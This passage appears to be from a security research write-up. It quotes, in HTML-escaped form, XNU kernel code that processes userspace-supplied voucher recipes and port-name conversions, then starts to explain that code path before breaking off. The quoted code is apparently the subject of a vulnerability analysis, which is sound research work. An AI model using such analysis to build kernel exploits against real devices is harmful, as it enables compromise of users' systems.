 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* iterate over the recipe items */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_used&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_t prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* find the next recipe */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; sub_recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipes&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_used&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; recipe_used &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* convert voucher port name (current space) */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* into a voucher reference */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; prev_iv &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; convert_port_name_to_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;previous_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;MACH_PORT_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;previous_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IV_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_INVALID_CAPABILITY&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_voucher_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;prev_iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_dealloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;At the top of this snippet a new voucher is allocated in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_alloc&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;is then called in a loop to consume however many sub-recipe structures were provided by userspace. Each sub-recipe can optionally refer to an existing voucher via the sub-recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. Note that MIG doesn&amp;#39;t natively support variable-sized structures containing ports so it&amp;#39;s passed as a mach port name which is looked up in the calling task&amp;#39;s mach port namespace and converted to a voucher reference by &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;convert_port_name_to_voucher&lt;/span&gt;&lt;span&gt;. The intended functionality here is to be able to refer to &lt;/span&gt;&lt;span 